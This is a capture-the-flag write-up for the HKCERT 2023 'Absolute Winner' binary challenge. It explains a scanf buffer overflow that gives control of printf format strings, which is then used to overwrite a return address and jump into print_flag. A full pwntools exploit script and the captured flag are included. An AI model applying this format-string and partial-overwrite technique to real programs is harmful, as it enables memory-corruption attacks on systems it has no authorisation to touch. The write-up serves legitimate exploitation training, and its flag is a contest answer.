# Absolute Winner

## Challenge

The program asks us to make a bet, then pick a number in 1-10.
If we win, our balance increases by the bet amount, otherwise the program exits.
Once we pass $1000000, we will be given the flag.

## Solution

The game is impossible when played normally, as the correct number is calculated to always be different than our guess.

On the first `Y/N` prompt, we can overflow the buffer due to the use of `scanf("%s", ...)`.
A large overflow will be caught, which leads to an error message being printed and the program immediately exiting.
However, the error strings are stored on the stack and passed as format strings to `printf`.
If we overwrite these strings in our overflow, we can control the format string and use it to control RIP.

We start by using the first pointer in the base pointer chain to overwrite the second pointer, making it point to a lower stack address.
This stack address is hopefully the return address of `printf`.
We then overwrite the lowest two bytes of this return address to jump into the `print_flag` function.

This has about a 1/256 chance in succeeding.
We need to successfully guess the lowest byte of the stack address (1/16) and the second lowest byte of the `print_flag` function (1/16).

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.hkcert23.pwnable.hk --port 28246 chall/src/chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall/src/chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.hkcert23.pwnable.hk'
port = int(args.PORT or 28246)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
tbreak *(pretty_alert+97)
continue
tel -l 20
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

while True:
    io = start()

    first = 0x38
    second = 0x84b4

    fmtstr = f'%c%c%c%c%c%c%{first - 6}c%hhn%{second - first}c%22$hn'.encode()
    io.sendlineafter(b'Are you ready? Y/N : ', flat({0x30 : fmtstr}))

    try:
        io.recvuntil(b'What')
    except:
        io.close()
        continue

    print(io.recvuntil(b' !\n'))
    break
```

## Flag

```
hkcert23{h0w_u_Bea7_x+1=x_??}
```
